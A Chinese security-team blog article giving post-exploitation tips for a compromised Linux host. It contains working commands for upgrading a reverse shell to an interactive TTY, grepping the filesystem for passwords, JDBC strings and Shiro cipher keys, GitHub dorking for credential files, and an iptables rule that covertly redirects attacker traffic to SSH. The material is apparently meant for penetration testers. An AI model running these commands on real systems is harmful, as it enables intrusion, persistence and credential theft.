\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/RHIoR6FPwkUvsR-bea8FgA)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMqXyOIeCdqM3p6cDcJajNxkXU9Xaoicb7cHysyiad3YELb0DeBibhEUbmA/640?wx_fmt=png)

本文由团队大佬 Cedr0ic 总结编写

**01**

**姿势⼀ - 反弹 shell 后如何保持会话不断**

⼀般弹回来⼀个 shell 后我们⾸先要确保 shell 不能掉，这⾥可以借⽤ screen 来保存会话

screen 

screen -ls

Screen -r 会话 id

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMUaL5o9CbTKKqfAQuOKr6pI8DtQDVVBYCoZxGXfnacTauBGpeLHTAVg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMIWbJ5Iicqb762hZs9qdrI6cfibmKygfuMmice1RR9pIuXqhV0CPqt3GBQ/640?wx_fmt=png)

**02**

**姿势⼆ - 如何将反弹 shell ⽣成交互式的 shell**

⼀般反弹回来的 shell 有很多缺陷

1\. ⼀些命令，⽐如 “su” 和“ssh”需要适当的终端才能运⾏

2\. 标准错误信息（STDERR）经常不会被显示出来

3\. 不能正确使⽤⽂本编辑器如 VIM

4\. 没有命令补全功能

5.“上” 按键没有历史纪录功能

6\. 没有任务管理功能

7\. Ctrl-C 会断

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMN0tq1lUrflSyWKqCA3VLoz1cyHhl5KMCEUXJhhQjVOAY7KsibWjCGgQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOME3TvXOrWHicBUAKbyDnIMbeR9fxsLOuYIFEhHExeicaxcqG7IYIGcakw/640?wx_fmt=png)

因此这⾥需要⽣成⼀个交互式 shell 以下⼏⾏命令可以完成操作。

```
python -c 'import pty; pty.spawn("/bin/bash")' //⽣成py半交互式shell ctrl+Z

stty raw -echo fg

reset
export SHELL=bash
export TERM=xterm256-color stty rows 38 columns 116
```

新的交互式 shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMx0icVthHYYeA2LWjSjIEAQJQ9UlreROSYI64T7VVzFzYk2LaG3QkjfQ/640?wx_fmt=png)

**03**

**姿势三 - 如何快速信息收集获取服务器⼝令**

⼀、⼝令获取

获得目标主机的权限后，通过查看网站的配置文件，获得口令信息

常⽤密码⽂件收集整理

```
find / -name \*.properties 2>/dev/null | grep WEB-INF
find / -name "\*.properties" | xargs egrep -i "user|pass|pwd|uname|login|db\_" find / -regex ".\*\\.properties\\|.\*\\.conf\\|.\*\\.config" | xargs grep -E "=jdbc:|pass="

find /webapp -regex ".\*\\.properties" -print 2>/dev/null | xargs grep -E "=jdbc:|rsync"

find / -regex ".\*\\.properties" -print  2>/dev/null
find / -regex ".\*\\.properties\\|.\*\\.conf\\|.\*\\.config\\|.\*\\.sh" | xargs grep -E "=jdbc:|pass=|passwd="
grep -r 'setCipherKey(Base64.decode(' /web路径
find / -regex ".\*\\.xml\\|.\*\\.properties\\|.\*\\.conf\\|.\*\\.config\\|.\*\\.jsp" | xargs grep -E "setCipherKey"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMyCpjPbWYlRX4WATs7ZalzE6j56TfOoQEPWVvBbUFly8CoSYLtiaov7g/640?wx_fmt=png)

⼆、github 搜密码技巧

xxx.com  filename:properties

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMVTQia57ib8Fu0MLBics4f7I8CRchqwkXryFfUgxbqBk6aiauU23sHKqkHg/640?wx_fmt=png)

**04**

**姿势四 - 隧道代理技术绕过⼤部分杀软**

服务器出⽹：https://github.com/ehang-io/nps（安装使⽤⽅法这⾥省略）

⽀持多种协议代理⽅式

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMSCflyliax3oATag3tVNudNx4BBP1K5C7uIOgS91oCNhOITv5hZjiaJDA/640?wx_fmt=png)

服务器不出⽹：使⽤端⼝复⽤技巧

iptables -t nat -I PREROUTING 1 -p tcp -s 攻击者的 IP --dport 80 -j DNAT -- to-destination 靶机的 IP:22

配置完成后，攻击者的 IP 连接靶机的 80 端⼝，可登录靶机的 SSH 服务；其它机器可正常访问靶机的 HTTP 服务；

攻击者的 IP 没法访问靶机的 HTTP 服务。

**05**

**姿势五 - 使⽤脚本对内⽹常⻅服务进⾏快速扫描**

扫描⼯具：只需要 python 环境不需要其他库

https://github.com/PINGXcpost/F-NAScan-PLUS

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMqfDWzSQqHEia1ib7wLbOx85joRDqdlicxeaicOuTFsVRJIiaSavOUj2pecA/640?wx_fmt=png)

对 F-NAScan-PLUS 扫描报告中单个服务进⾏提取

https://github.com/soxfmr/F-NAScan-Export

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMwKja5luRiaU3c11t2EibkzscWPHbPkwxpFxdbicxvw0icuSzI1rIVzQ3pA/640?wx_fmt=png)

重要提醒！  

团队现开了微信交流群（每日资源分享），团队语雀知识库（每日积累）及知识星球（小范围精华内容传播及问答），欢迎加入（微信群通过公众号按钮 “加入我们” 获取联系方式）：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMIfRsqCgntOMs77KIUVGnMJKBZHkSUBB3cgYR0llpyr39VcHFWBy2hQ/640?wx_fmt=jpeg)

往期经典：

[《从入门到秃头之 PWN 蛇皮走位》](http://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&mid=2247484643&idx=1&sn=a8effd61504fc574ee7089f9ce8440af&chksm=9b370cd7ac4085c102e5f3ee1bd1fcb6f61fc56559edef3e4eb33d934c499c541d56c87ae7cd&scene=21#wechat_redirect)  

[图形验证码绕过新姿势之深度学习与 burp 结合](http://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&mid=2247484598&idx=1&sn=997f5329edb5ad2850e8e129da32f175&chksm=9b370c82ac4085941fe53b84ec5fa61961cbb4ef406ae2013773d6144a28a665be9f7e80a283&scene=21#wechat_redirect)[漏洞挖掘｜条件竞争在漏洞挖掘中的妙用](http://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&mid=2247484441&idx=1&sn=2f24cfe9e648118a4e537c0446e98119&chksm=9b370c2dac40853bf285a7e3fcbb8d83cba2aa34e82d81346af29d38c2855269dbc094aaab1e&scene=21#wechat_redirect)

[MSF 下域内渗透](http://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&mid=2247483757&idx=1&sn=b61cdd38f5ade560af07f9321176d58e&chksm=9b370959ac40804f7384f4484e2586be29969306bd3eef06b90767fa2363d57436bf1e180424&scene=21#wechat_redirect)  

[“最后” 的 Bypass CDN 查找网站真实 IP](http://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&mid=2247483674&idx=1&sn=da83b8ed28783252a1798974f91ea8aa&chksm=9b37092eac40803805d2662f93d77ce88bdb5e18efeec9bc684dfdaa6daeb8d95cf6f92669db&scene=21#wechat_redirect)  

[HVV 前奏｜最新版 AWVS&Nessus 破解及批量脚本分享](http://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&mid=2247484137&idx=2&sn=286c87de932713c7e0951e9633a9fda9&chksm=9b370addac4083cb868bed7429c420f7feb101abd69550cd8cc4645f31e18b29d5d7f93cb3f7&scene=21#wechat_redirect)  

[移动安全（一）|Android 设备 root 及神器 Xposed 框架安装](http://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&mid=2247483763&idx=1&sn=413f469223f181f48f82a344ce1d9c06&chksm=9b370947ac4080514962fbe586ba525ddc9029ab02ed72ffc9aac458859ac428e9432bb76f6b&scene=21#wechat_redirect)  

[移动安全 - APP 渗透进阶之 AppCan 本地文件解密](http://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&mid=2247484404&idx=1&sn=184cb740fcdcdccc6f41f81c9abbc008&chksm=9b370bc0ac4082d6ef87004b1ce7e7c5e4d618a8e4696021d805e90a31c6a32b23c4139c5b50&scene=21#wechat_redirect)  

[漏洞笔记 | 记一次与 XXE 漏洞的爱恨纠缠](http://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&mid=2247483808&idx=1&sn=e49283ccb0de1a3b7ac89e9cdb6d0e2f&chksm=9b370994ac4080829721246426d4dee351a4b7bdc2ac737f1f5fe1eb1a69eeb8a1dcaeb50b13&scene=21#wechat_redirect)  

安

全

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Ov836aiagXu6QjcUJ7PANdN0pQJFo6ZOMYtCDjiaB5dg0TXT5vL4ldibEiacDdz9EL4s83YH3k0UibCRDvw69eWoQdA/640?wx_fmt=jpeg)

**扫描二维码 ｜****关注我们**

微信号 : WhITECat\_007  ｜  名称：WhITECat 安全团队